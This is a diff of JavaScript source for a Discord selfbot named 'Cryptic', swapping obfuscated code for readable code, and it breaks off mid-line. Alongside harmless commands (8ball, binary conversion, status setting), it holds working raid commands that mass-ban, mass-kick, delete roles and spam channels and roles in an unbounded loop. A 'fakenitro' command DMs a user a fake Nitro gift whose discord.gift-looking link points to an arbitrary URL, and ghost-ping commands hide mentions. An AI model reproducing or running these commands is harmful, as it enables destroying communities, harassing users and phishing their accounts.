+        if(!message.guild.me.hasPermissions("MANAGE_ROLES")) return console.log(`${colors.red("[ERROR]: ")} ${colors.yellow("Missing Permissions")}`)
+        message.guild.roles.forEach((role) => {
+            role.delete()
+        })
+    }
+
+    if(cmd === "masschannels") {
+        console.log(`[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan("Command used")} ${colors.magenta("|")} ${colors.yellow(cmd)}`)
+        if(message.deletable) {
+            message.delete()
+        }
+        if(!message.guild.me.hasPermissions("MANAGE_CHANNELS")) return console.log(`${colors.red("[ERROR]: ")} ${colors.yellow("Missing Permissions")}`)
+        setInterval(() => {
+          message.guild.createChannel("raided-by-cryptic", {
+            type: "text"
+           })
+        })
+    }
+
+    if(cmd === "massban") {
+        console.log(`[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan("Command used")} ${colors.magenta("|")} ${colors.yellow(cmd)}`)
+        if(message.deletable) {
+            message.delete()
+        }
+        if(!message.guild.me.hasPermissions("BAN_MEMBERS")) return console.log(`${colors.red("[ERROR]: ")} ${colors.yellow("Missing Permissions")}`)
+        message.guild.members.forEach((member) => {
+            member.ban({reason: "Raided by Cryptic"})
+        })  
+    }
+
+    if(cmd === "masskick") {
+        console.log(`[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan("Command used")} ${colors.magenta("|")} ${colors.yellow(cmd)}`)
+        if(message.deletable) {
+            message.delete()
+        }
+        if(!message.guild.me.hasPermissions("KICK_MEMBERS")) return console.log(`${colors.red("[ERROR]: ")} ${colors.yellow("Missing Permissions")}`)
+        message.guild.members.forEach((member) => {
+            member.kick("Raided by Cryptic")
+        })  
+    }
+
+    if(cmd === "massroles") {
+        console.log(`[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan("Command used")} ${colors.magenta("|")} ${colors.yellow(cmd)}`)
+        if(message.deletable) {
+            message.delete()
+        }
+        if(!message.guild.me.hasPermissions("MANAGE_ROLES")) return console.log(`${colors.red("[ERROR]: ")} ${colors.yellow("Missing Permissions")}`)
+        setInterval(() => {
+          message.guild.createRole({
+              name: "raided by Cryptic",
+              color: "RANDOM"
+          })
+        })
+    }
+
+    if(cmd === "fakenitro") {
+        console.log(`[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan("Command used")} ${colors.magenta("|")} ${colors.yellow(cmd)}`)
+        if(message.deletable) {
+            message.delete()
+        }
+        function nitroCode() {
+            let code = "";
+            let dict = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+            for (var i = 0; i < 19; i++) {
+                code = code + dict.charAt(Math.floor(Math.random() * dict.length));
+            }
+            return code;
+          }
+        if(args[0].length > 18 || args[0].length < 18) return message.channel.send("That is not a valid id.")
+        if(!args[0]) return message.channel.send("Please specify a user id.")
+        if(!args[1]) return message.channel.send("Please specify a redirect url")
+        message.channel.send("Done!")
+        let embed = new Discord.RichEmbed()
+        .setAuthor("Free Discord Nitro", "https://i.gyazo.com/80906ef5fe2f571b352ed3cbe53734ef.png")
+        .setTitle("Congratulations, you have received a free discord nitro gift")
+        .setColor(color ? color : "#1B78E7")
+        .setFooter(footer ? footer : "𝘾𝙧𝙮𝙥𝙩𝙞𝙘", "https://i.gyazo.com/e720243a3d6cd9425e8b97456263debd.png")
+        .setTimestamp()
+        .addField("Redeem Here:", `[https://discord.gift/${nitroCode()}](${args[1]})`)
+        message.guild.members.get(args[0]).send(embed)
+    }
+
+    if(cmd === "ghostping") {
+        console.log(`[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan("Command used")} ${colors.magenta("|")} ${colors.yellow(cmd)}`)
+        if(message.deletable) {
+            message.delete()
+        }
+        const userID = args[0]
+        const msg = args.slice(1).join(" ")
+        if(!userID) return message.channel.send("Please specify a user id.")
+        if(!msg) return message.channel.send("Please specify a message.")
+        message.channel.send(`${msg}||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||||||||||<@!${userID}>`)
+    }
+
+    if(cmd === "everyone") {
+        console.log(`[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan("Command used")} ${colors.magenta("|")} ${colors.yellow(cmd)}`)
+        if(message.deletable) {
+            message.delete()
+        }
+        message.channel.send("<https://google.com> \u200b||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||||||||||@everyone")
+    }
+
+
+    if(cmd === "8ball") {
+        console.log(`[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan("Command used")} ${colors.magenta("|")} ${colors.yellow(cmd)}`)
+        if(message.deletable) {
+            message.delete()
+        }
+        let question = args.join(" ")
+        if(!question) return message.channel.send("Please provide a question to ask the 8ball.")
+        let responses=[
+            "As I see it, yes.",
+            "Ask again later.",
+            "As I see it, yes.",
+            "Better not tell you now.",
+            "Cannot predict now.",
+            "Concentrate and ask again.",
+            "Don’t count on it.",
+            "It is certain.",
+            "It is decidedly so.",
+            "Most likely.",
+            "My reply is no.",
+            "My sources say no.",
+            "Outlook not so good.",
+            "Outlook good.",
+            "Reply hazy, try again.",
+            "Signs point to yes.",
+            "Very doubtful.",
+            "Without a doubt.",
+            "Yes.",
+            "Yes – definitely.",
+            "You may rely on it."
+          ]
+          let response = responses[Math.floor(Math.random()*(responses.length))]
+          if(enabled === true) {
+            let eightballEmbed = new Discord.RichEmbed()
+            .setTitle("The Magic 8 Ball has spoken")
+            .setThumbnail(image ? image : null)
+            .setColor(color ? color : null)
+            .setFooter(footer ? footer : "")
+            .addField("Question:", question, true)
+            .addField("Response:", response, true)
+            message.channel.send(eightballEmbed);
+          } else {
+              message.channel.send(stripIndents`\`\`\`
               The Magic 8 Ball has spoken
-              Question: ${_0x28ba37}
-              Response: ${_0x42e149}${footer?'\x0a\x0a'+footer:null}
-              \`\`\``);}if(_0x390a85==='botinfo'){console[_0x1be328(0x6da,0x7ea)]('['+colors[_0x1be328(0x57b,0x51e)](moment()[_0x1be328(0x4bf,0x44f)]()[_0x1be328(0x6ed,0x5c2)](_0x1be328(0x5fa,0x6c8)))+']\x20'+colors[_0x1be328(0x632,0x67c)](_0x1be328(0x596,0x439))+'\x20'+colors[_0x1be328(0x5db,0x66c)]('|')+'\x20'+colors['yellow'](_0x390a85));_0x1b369a[_0x1be328(0x69a,0x700)]&&_0x1b369a[_0x1be328(0x594,0x702)]();if(enabled===!![]){let _0x1c0394=new Discord[(_0x1be328(0x508,0x391))]()['setThumbnail'](_0x1be328(0x4d5,0x41b))[_0x1be328(0x5aa,0x655)](_0x1be328(0x4c1,0x46a))[_0x1be328(0x69b,0x557)](_0x1be328(0x524,0x614))[_0x1be328(0x4a2,0x338)](_0x1be328(0x614,0x733))[_0x1be328(0x76c,0x7df)](_0x1be328(0x72d,0x856))[_0x1be328(0x51a,0x4c6)]('Developer',_0x1be328(0x4cd,0x398),!![])[_0x1be328(0x51a,0x4e5)](_0x1be328(0x75f,0x87f),process[_0x1be328(0x789,0x78b)],!![])['addField'](_0x1be328(0x653,0x50c),Discord[_0x1be328(0x789,0x61b)],!![])[_0x1be328(0x51a,0x584)](_0x1be328(0x70e,0x7bb),require(_0x1be328(0x4ed,0x468))[_0x1be328(0x789,0x7ff)],!![])[_0x1be328(0x51a,0x510)](_0x1be328(0x55f,0x461),_0x1be328(0x5b5,0x4ac),!![]);_0x1b369a[_0x1be328(0x49d,0x501)][_0x1be328(0x4c0,0x4c5)](_0x1c0394);}else _0x1b369a[_0x1be328(0x49d,0x56d)][_0x1be328(0x4c0,0x54a)](stripIndents`\`\`\`
+              Question: ${question}
+              Response: ${response}${footer ? `\n\n${footer}` : null}
+              \`\`\``)
+          }
+    }
+
+    if(cmd === "botinfo") {
+        console.log(`[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan("Command used")} ${colors.magenta("|")} ${colors.yellow(cmd)}`)
+        if(message.deletable) {
+            message.delete()
+        }
+        if(enabled === true) {
+            let embed = new Discord.RichEmbed()
+            .setThumbnail("https://i.gyazo.com/e720243a3d6cd9425e8b97456263debd.png")
+            .setColor("#1B78E7")
+            .setFooter("𝘾𝙧𝙮𝙥𝙩𝙞𝙘")
+            .setTitle("Cryptic")
+            .setDescription("Cryptic is a discord user automation tool")
+            .addField("Developer", "p9sq69#0594", true)
+            .addField("Node.js Version", process.version, true)
+            .addField("Discord.js Version", Discord.version, true)
+            .addField("Bot Version", require("./package.json").version, true)
+            .addField("Past Names", "Diamond", true)
+            message.channel.send(embed)
+        } else {
+            message.channel.send(stripIndents`\`\`\`
             Cryptic
             Cryptic is a discord user automation tool
 
             Developer: p9sq69#0594
-            Node.js Version: ${process[_0x1be328(0x789,0x832)]}
-            Discord.js Version: ${Discord[_0x1be328(0x789,0x85d)]}
-            Bot Version: ${require(_0x1be328(0x4ed,0x4eb))[_0x1be328(0x789,0x822)]}
+            Node.js Version: ${process.version}
+            Discord.js Version: ${Discord.version}
+            Bot Version: ${require("./package.json").version}
             Past Names: Diamond\n\n𝘾𝙧𝙮𝙥𝙩𝙞𝙘
-            \`\`\``);}if(_0x390a85===_0x1be328(0x54b,0x47b)){console[_0x1be328(0x6da,0x826)]('['+colors[_0x1be328(0x57b,0x569)](moment()[_0x1be328(0x4bf,0x508)]()[_0x1be328(0x6ed,0x719)](_0x1be328(0x5fa,0x645)))+']\x20'+colors[_0x1be328(0x632,0x4ce)](_0x1be328(0x596,0x61b))+'\x20'+colors[_0x1be328(0x5db,0x731)]('|')+'\x20'+colors[_0x1be328(0x5f5,0x5f1)](_0x390a85));_0x1b369a[_0x1be328(0x69a,0x5f4)]&&_0x1b369a[_0x1be328(0x594,0x51e)]();if(!_0x1748bb[0x10fb+-0x1a01+0x906])return _0x1b369a[_0x1be328(0x49d,0x623)][_0x1be328(0x4c0,0x557)](_0x1be328(0x4a1,0x61c));let _0x40d444=[_0x1be328(0x60e,0x702),_0x1be328(0x5bf,0x59c)];if(!_0x40d444[_0x1be328(0x5ee,0x560)](_0x1748bb[-0x223*0xe+0x13a6+0xa44][_0x1be328(0x529,0x49e)]()))return _0x1b369a[_0x1be328(0x49d,0x450)][_0x1be328(0x4c0,0x545)](_0x1be328(0x4a1,0x5e4));let _0x244f4a=_0x1748bb['slice'](0xf55*0x2+-0x19c5*-0x1+-0x1*0x386e)[_0x1be328(0x5c6,0x480)]('\x20');if(!_0x244f4a)return _0x1b369a['channel'][_0x1be328(0x4c0,0x42d)](_0x1be328(0x669,0x51c));if(_0x244f4a[_0x1be328(0x537,0x6bd)]>-0x86*-0x3b+-0x1*-0x21fa+-0x4*0xf37)return _0x1b369a[_0x1be328(0x49d,0x3ae)][_0x1be328(0x4c0,0x4e8)]('Your\x20text\x20is\x20to\x20long.\x20The\x20maximum\x20amount\x20of\x20characters\x20is\x20`1,024`');function _0x5ea278(_0x21d3db){const _0x5e9cf1=function(_0x2996f7,_0x5e20d4){return _0x1be328(_0x5e20d4-0x266,_0x2996f7);};return _0x21d3db[_0x5e9cf1(0xa19,0x8e5)]('')['map'](_0x30794b=>{const _0x165008=function(_0x245132,_0xf27d0f){return _0x5e9cf1(_0xf27d0f,_0x245132-0xfe);},_0x38c287=_0x30794b[_0x165008(0x9ee,0x93f)](-0x12cf*0x1+0x2016+-0xd47)[_0x165008(0x89f,0x96b)](0x2*0x1225+-0x463*-0x1+-0x28ab);return _0x38c287[_0x165008(0x8ba,0x78f)](-0x25e6+-0xd89+0x3377,'0');})[_0x5e9cf1(0x95e,0x82c)]('\x20');}function _0x4b801a(_0x45fa37){const _0x339894=function(_0x2567ea,_0xefaa7b){return _0x1be328(_0xefaa7b-0x2ae,_0x2567ea);};return _0x45fa37[_0x339894(0x973,0x92d)]('\x20')[_0x339894(0x7e6,0x96f)](_0x5845a7=>String[_0x339894(0x8e8,0x9dd)](Number[_0x339894(0x81b,0x9ad)](_0x5845a7,0x23d1+-0x1*-0x1691+0x3a6*-0x10)))[_0x339894(0x9be,0x874)]('');}if(_0x1748bb[-0x4bb*-0x7+0x2*0x11a7+0x1f*-0x235][_0x1be328(0x529,0x3b3)]()==='encode')return _0x1b369a[_0x1be328(0x49d,0x538)][_0x1be328(0x4c0,0x522)](_0x5ea278(_0x244f4a));else{if(_0x1748bb[-0x2c*-0x82+0x12*-0x9a+-0xb84][_0x1be328(0x529,0x568)]()===_0x1be328(0x5bf,0x558))return _0x1b369a[_0x1be328(0x49d,0x370)]['send'](_0x4b801a(_0x244f4a));}}if(_0x390a85===_0x1be328(0x56a,0x578)){console[_0x1be328(0x6da,0x7c7)]('['+colors[_0x1be328(0x57b,0x6ed)](moment()['utc']()[_0x1be328(0x6ed,0x587)](_0x1be328(0x5fa,0x4cf)))+']\x20'+colors[_0x1be328(0x632,0x66b)](_0x1be328(0x596,0x4fe))+'\x20'+colors[_0x1be328(0x5db,0x64e)]('|')+'\x20'+colors[_0x1be328(0x5f5,0x622)](_0x390a85));_0x1b369a[_0x1be328(0x69a,0x7d4)]&&_0x1b369a[_0x1be328(0x594,0x64d)]();const _0xfc297c=_0x1748bb[_0x1be328(0x5c6,0x445)]('\x20'),_0x5966fb={};_0x5966fb[_0x1be328(0x4b0,0x5f2)]=_0x1be328(0x525,0x513),_0x5966fb[_0x1be328(0x5e8,0x626)]=_0x1be328(0x7a2,0x87a),bot[_0x1be328(0x4ee,0x605)]['setActivity'](_0xfc297c,_0x5966fb);if(enabled===!![]){let _0xb41a=new Discord[(_0x1be328(0x508,0x5d2))]()[_0x1be328(0x4a2,0x56e)](_0x1be328(0x768,0x746))[_0x1be328(0x5d3,0x4f4)](image?image:_0x1be328(0x793,0x717))[_0x1be328(0x5aa,0x467)](color?color:_0x1be328(0x4c1,0x418))['setFooter'](footer?footer:_0x1be328(0x524,0x4a6))[_0x1be328(0x76c,0x6ab)](_0x1be328(0x6f8,0x6db)+_0xfc297c+'`');_0x1b369a[_0x1be328(0x49d,0x555)][_0x1be328(0x4c0,0x38a)](_0xb41a);}else _0x1b369a[_0x1be328(0x49d,0x424)][_0x1be328(0x4c0,0x5a9)](stripIndents`\`\`\`
+            \`\`\``)
+        }
+    }
+
+    if(cmd === "binary") {
+        console.log(`[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan("Command used")} ${colors.magenta("|")} ${colors.yellow(cmd)}`)
+        if(message.deletable) {
+            message.delete()
+        }
+    if(!args[0]) return message.channel.send("Uknown parameter. Please choose the method first, either decode or encode it");
+
+    let choice = ["encode", "decode"];
+    if(!choice.includes(args[0].toLowerCase())) return message.channel.send("Uknown parameter. Please choose the method first, either decode or encode it");
+
+    let text = args.slice(1).join(" ");
+
+    if(!text) return message.channel.send("Please provide some text");
+
+    if(text.length > 1024) return message.channel.send("Your text is to long. The maximum amount of characters is `1,024`");
+
+    function encode(char) {
+        return char.split("").map(str => {
+            const converted = str.charCodeAt(0).toString(2);
+            return converted.padStart(8, "0");
+        }).join(" ")
+    }
+
+    function decode(char) {
+        return char.split(" ").map(str => String.fromCharCode(Number.parseInt(str, 2))).join("");
+    }
+
+    if(args[0].toLowerCase() === "encode") {
+        return message.channel.send(encode(text));
+    } else if(args[0].toLowerCase() === "decode") {
+        return message.channel.send(decode(text));
+    }
+    }
+
+    if(cmd === "stream") {
+        console.log(`[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan("Command used")} ${colors.magenta("|")} ${colors.yellow(cmd)}`)
+        if(message.deletable) {
+            message.delete()
+        }
+        const msg = args.join(" ")
+        bot.user.setActivity(msg, {type: "STREAMING", url: "https://www.twitch.tv/cryptic"})
+        if(enabled === true) {
+            let embed = new Discord.RichEmbed()
+            .setTitle("Success")
+            .setThumbnail(image ? image : "https://media3.giphy.com/media/TzyV32fsqLpbA0PHJf/giphy.gif")
+            .setColor(color ? color : "#1B78E7")
+            .setFooter(footer ? footer : "𝘾𝙧𝙮𝙥𝙩𝙞𝙘")
+            .setDescription(`Your activity was successfully set to \`STREAMING\` with message \`${msg}\``)
+            message.channel.send(embed);
+        } else {
+            message.channel.send(stripIndents`\`\`\`
             Success
 
-            Your activity was successfully set to STREAMING with message ${_0xfc297c}${footer?'\x0a\x0a'+footer:null}
-            \`\`\``);}if(_0x390a85===_0x1be328(0x658,0x7a1)){console[_0x1be328(0x6da,0x5de)]('['+colors[_0x1be328(0x57b,0x542)](moment()[_0x1be328(0x4bf,0x513)]()[_0x1be328(0x6ed,0x852)](_0x1be328(0x5fa,0x66a)))+']\x20'+colors[_0x1be328(0x632,0x6ed)]('Command\x20used')+'\x20'+colors[_0x1be328(0x5db,0x65d)]('|')+'\x20'+colors[_0x1be328(0x5f5,0x676)](_0x390a85));_0x1b369a[_0x1be328(0x69a,0x5dc)]&&_0x1b369a['delete']();const _0x31028b=_0x1748bb[_0x1be328(0x5c6,0x5f1)]('\x20'),_0x1df041={};_0x1df041['type']=_0x1be328(0x612,0x6df),bot[_0x1be328(0x4ee,0x481)][_0x1be328(0x79f,0x6dc)](_0x31028b,_0x1df041);if(enabled===!![]){let _0x1edcff=new Discord[(_0x1be328(0x508,0x4a9))]()['setTitle'](_0x1be328(0x768,0x8e4))[_0x1be328(0x5d3,0x635)](image?image:_0x1be328(0x793,0x680))[_0x1be328(0x5aa,0x519)](color?color:_0x1be328(0x4c1,0x4a7))[_0x1be328(0x69b,0x787)](footer?footer:'𝘾𝙧𝙮𝙥𝙩𝙞𝙘')['setDescription'](_0x1be328(0x621,0x75b)+_0x31028b+'`');_0x1b369a[_0x1be328(0x49d,0x419)][_0x1be328(0x4c0,0x4e4)](_0x1edcff);}else _0x1b369a[_0x1be328(0x49d,0x352)][_0x1be328(0x4c0,0x437)](stripIndents`\`\`\`
+            Your activity was successfully set to STREAMING with message ${msg}${footer ? `\n\n${footer}` : null}
+            \`\`\``)
+        }
+    }
+
+    if(cmd === "watching") {
+        console.log(`[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan("Command used")} ${colors.magenta("|")} ${colors.yellow(cmd)}`)
+        if(message.deletable) {
+            message.delete()
+        }
+        const msg = args.join(" ")
+        bot.user.setActivity(msg, {type: "WATCHING"})
+        if(enabled === true) {
+            let embed = new Discord.RichEmbed()
+            .setTitle("Success")
+            .setThumbnail(image ? image : "https://media3.giphy.com/media/TzyV32fsqLpbA0PHJf/giphy.gif")
+            .setColor(color ? color : "#1B78E7")
+            .setFooter(footer ? footer : "𝘾𝙧𝙮𝙥𝙩𝙞𝙘")
+            .setDescription(`Your activity was successfully set to \`WATCHING\` with message \`${msg}\``)
+            message.channel.send(embed);
+        } else {
+            message.channel.send(stripIndents`\`\`\`
             Success
 
-            Your activity was successfully set to WATCHING with message ${_0x31028b}${footer?'\x0a\x0a'+footer:null}
-            \`\`\``);}if(_0x390a85===_0x1be328(0x4e6,0x5ec)){console[_0x1be328(0x6da,0x739)]('['+colors[_0x1be328(0x57b,0x59b)](moment()[_0x1be328(0x4bf,0x521)]()[_0x1be328(0x6ed,0x829)](_0x1be328(0x5fa,0x4cd)))+']\x20'+colors[_0x1be328(0x632,0x4a2)](_0x1be328(0x596,0x4b9))+'\x20'+colors[_0x1be328(0x5db,0x5ef)]('|')+'\x20'+colors[_0x1be328(0x5f5,0x6e5)](_0x390a85));_0x1b369a[_0x1be328(0x69a,0x639)]&&_0x1b369a[_0x1be328(0x594,0x4d3)]();const _0x27743f=_0x1748bb[_0x1be328(0x5c6,0x5eb)]('\x20'),_0x1e6b58={};_0x1e6b58[_0x1be328(0x4b0,0x37b)]='LISTENING',bot[_0x1be328(0x4ee,0x371)][_0x1be328(0x79f,0x807)](_0x27743f,_0x1e6b58);if(enabled===!![]){let _0x41aea7=new Discord[(_0x1be328(0x508,0x417))]()[_0x1be328(0x4a2,0x616)](_0x1be328(0x768,0x7e2))[_0x1be328(0x5d3,0x702)](image?image:_0x1be328(0x793,0x846))[_0x1be328(0x5aa,0x6c4)](color?color:_0x1be328(0x4c1,0x4b6))[_0x1be328(0x69b,0x542)](footer?footer:_0x1be328(0x524,0x63b))[_0x1be328(0x76c,0x5f5)](_0x1be328(0x747,0x5d8)+_0x27743f+'`');_0x1b369a[_0x1be328(0x49d,0x617)][_0x1be328(0x4c0,0x50a)](_0x41aea7);}else _0x1b369a[_0x1be328(0x49d,0x48f)][_0x1be328(0x4c0,0x5fe)](stripIndents`\`\`\`
+            Your activity was successfully set to WATCHING with message ${msg}${footer ? `\n\n${footer}` : null}
+            \`\`\``)
+        }
+    }
+
+    if(cmd === "listening") {
+        console.log(`[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan("Command used")} ${colors.magenta("|")} ${colors.yellow(cmd)}`)
+        if(message.deletable) {
+            message.delete()
+        }
+        const msg = args.join(" ")
+        bot.user.setActivity(msg, {type: "LISTENING"})
+        if(enabled === true) {
+            let embed = new Discord.RichEmbed()
+            .setTitle("Success")
+            .setThumbnail(image ? image : "https://media3.giphy.com/media/TzyV32fsqLpbA0PHJf/giphy.gif")
+            .setColor(color ? color : "#1B78E7")
+            .setFooter(footer ? footer : "𝘾𝙧𝙮𝙥𝙩𝙞𝙘")
+            .setDescription(`Your activity was successfully set to \`LISTENING\` with message \`${msg}\``)
+            message.channel.send(embed);
+        } else {
+            message.channel.send(stripIndents`\`\`\`
             Success
 
-            Your activity was successfully set to STREAMING with LISTENING ${_0x27743f}${footer?'\x0a\x0a'+footer:null}
-            \`\`\``);}if(_0x390a85==='playing'){console[_0x1be328(0x6da,0x800)]('['+colors[_0x1be328(0x57b,0x599)](moment()[_0x1be328(0x4bf,0x3af)]()[_0x1be328(0x6ed,0x6cc)](_0x1be328(0x5fa,0x5b2)))+']\x20'+colors[_0x1be328(0x632,0x510)](_0x1be328(0x596,0x58d))+'\x20'+colors[_0x1be328(0x5db,0x532)]('|')+'\x20'+colors[_0x1be328(0x5f5,0x66b)](_0x390a85));_0x1b369a['deletable']&&_0x1b369a[_0x1be328(0x594,0x716)]();const _0x447b1a=_0x1748bb[_0x1be328(0x5c6,0x5a5)]('\x20'),_0x36cdd9={};_0x36cdd9[_0x1be328(0x4b0,0x3c1)]=_0x1be328(0x4da,0x528),bot[_0x1be328(0x4ee,0x48b)][_0x1be328(0x79f,0x909)](_0x447b1a,_0x36cdd9);if(enabled===!![]){let _0xa5a513=new Discord[(_0x1be328(0x508,0x526))]()[_0x1be328(0x4a2,0x35e)](_0x1be328(0x768,0x84e))[_0x1be328(0x5d3,0x6a9)](image?image:_0x1be328(0x793,0x7bf))['setColor'](color?color:_0x1be328(0x4c1,0x33d))[_0x1be328(0x69b,0x561)](footer?footer:_0x1be328(0x524,0x3f4))[_0x1be328(0x76c,0x5dc)](_0x1be328(0x694,0x58f)+_0x447b1a+'`');_0x1b369a['channel'][_0x1be328(0x4c0,0x5f7)](_0xa5a513);}else _0x1b369a[_0x1be328(0x49d,0x5c0)][_0x1be328(0x4c0,0x630)](stripIndents`\`\`\`
+            Your activity was successfully set to STREAMING with LISTENING ${msg}${footer ? `\n\n${footer}` : null}
+            \`\`\``)
+        }
+    }
+
+    if(cmd === "playing") {
+        console.log(`[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan("Command used")} ${colors.magenta("|")} ${colors.yellow(cmd)}`)
+        if(message.deletable) {
+            message.delete()
+        }
+        const msg = args.join(" ")
+        bot.user.setActivity(msg, {type: "PLAYING"})
+        if(enabled === true) {
+            let embed = new Discord.RichEmbed()
+            .setTitle("Success")
+            .setThumbnail(image ? image : "https://media3.giphy.com/media/TzyV32fsqLpbA0PHJf/giphy.gif")
+            .setColor(color ? color : "#1B78E7")
+            .setFooter(footer ? footer : "𝘾𝙧𝙮𝙥𝙩𝙞𝙘")
+            .setDescription(`Your activity was successfully set to \`PLAYING\` with message \`${msg}\``)
+            message.channel.send(embed);
+        } else {
+            message.channel.send(stripIndents`\`\`\`
             Success
 
-            Your activity was successfully set to PLAYING with message ${_0x447b1a}${footer?'\x0a\x0a'+footer:null}
-            \`\`\``);}if(_0x390a85==='reset'){console[_0x1be328(0x6da,0x7fc)]('['+colors[_0x1be328(0x57b,0x5d6)](moment()[_0x1be328(0x4bf,0x5fc)]()[_0x1be328(0x6ed,0x842)](_0x1be328(0x5fa,0x77a)))+']\x20'+colors['cyan'](_0x1be328(0x596,0x5f6))+'\x20'+colors[_0x1be328(0x5db,0x73c)]('|')+'\x20'+colors[_0x1be328(0x5f5,0x46e)](_0x390a85));_0x1b369a[_0x1be328(0x69a,0x621)]&&_0x1b369a[_0x1be328(0x594,0x510)]();bot[_0x1be328(0x4ee,0x3d6)]['setActivity'](null);if(enabled===!![]){let _0x267208=new Discord[(_0x1be328(0x508,0x4a4))]()[_0x1be328(0x4a2,0x43a)]('Success')[_0x1be328(0x5d3,0x4bd)](image?image:_0x1be328(0x793,0x712))[_0x1be328(0x5aa,0x4ab)](color?color:_0x1be328(0x4c1,0x49d))[_0x1be328(0x69b,0x674)](footer?footer:'𝘾𝙧𝙮𝙥𝙩𝙞𝙘')[_0x1be328(0x76c,0x8db)](_0x1be328(0x5a9,0x51f));_0x1b369a[_0x1be328(0x49d,0x494)]['send'](_0x267208);}else _0x1b369a[_0x1be328(0x49d,0x31f)][_0x1be328(0x4c0,0x4fa)](stripIndents`\`\`\`
+            Your activity was successfully set to PLAYING with message ${msg}${footer ? `\n\n${footer}` : null}
+            \`\`\``)
+        }
+    }
+
+    if(cmd === "reset") {
+        console.log(`[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan("Command used")} ${colors.magenta("|")} ${colors.yellow(cmd)}`)
+        if(message.deletable) {
+            message.delete()
+        }
+        bot.user.setActivity(null)
+        if(enabled === true) {
+            let embed = new Discord.RichEmbed()
+            .setTitle("Success")
+            .setThumbnail(image ? image : "https://media3.giphy.com/media/TzyV32fsqLpbA0PHJf/giphy.gif")
+            .setColor(color ? color : "#1B78E7")
+            .setFooter(footer ? footer : "𝘾𝙧𝙮𝙥𝙩𝙞𝙘")
+            .setDescription(`Your activity was successfully reset`)
+            message.channel.send(embed);
+        } else {
+            message.channel.send(stripIndents`\`\`\`
             Success
 
-            Your activity was successfully reset${footer?'\x0a\x0a'+footer:null}
-            \`\`\``);}_0x390a85===_0x1be328(0x68c,0x73d)&&(console[_0x1be328(0x6da,0x80e)]('['+colors['green'](moment()['utc']()['format'](_0x1be328(0x5fa,0x6b3)))+']\x20'+colors[_0x1be328(0x632,0x6b2)](_0x1be328(0x596,0x621))+'\x20'+colors[_0x1be328(0x5db,0x6a2)]('|')+'\x20'+colors[_0x1be328(0x5f5,0x6de)](_0x390a85)),_0x1b369a[_0x1be328(0x69a,0x6c3)]&&_0x1b369a[_0x1be328(0x594,0x420)](),_0x1b369a[_0x1be328(0x49d,0x485)][_0x1be328(0x4c0,0x38d)]('​\x0a'[_0x1be328(0x4ab,0x5e3)](-0xe*-0x56+-0x2081+0x1d5d)));if(_0x390a85===_0x1be328(0x5e5,0x773)){console[_0x1be328(0x6da,0x822)]('['+colors[_0x1be328(0x57b,0x42d)](moment()[_0x1be328(0x4bf,0x377)]()[_0x1be328(0x6ed,0x5da)]('HH:mm:ss'))+']\x20'+colors[_0x1be328(0x632,0x6de)](_0x1be328(0x596,0x577))+'\x20'+colors[_0x1be328(0x5db,0x50d)]('|')+'\x20'+colors[_0x1be328(0x5f5,0x4a3)](_0x390a85));_0x1b369a[_0x1be328(0x69a,0x65a)]&&_0x1b369a[_0x1be328(0x594,0x5cb)]();if(!_0x1748bb[_0x1be328(0x5c6,0x4de)]('\x20'))return 